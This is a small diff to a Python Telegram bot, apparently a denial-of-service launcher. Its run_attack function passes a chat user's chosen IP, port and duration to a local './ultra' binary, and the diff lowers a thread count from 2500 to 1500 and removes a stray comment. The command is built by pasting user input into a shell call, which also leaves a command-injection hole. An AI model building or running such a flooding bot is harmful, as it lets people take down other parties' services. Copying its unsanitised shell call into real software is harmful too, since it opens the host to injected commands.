@@ -1,4 +1,3 @@
-ye py hai 
 import os
 import asyncio
 from telegram import Update
@@ -21,7 +20,7 @@ async def start(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./ultra {ip} {port} {duration} 2500",
+            f"./ultra {ip} {port} {duration} 1500",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
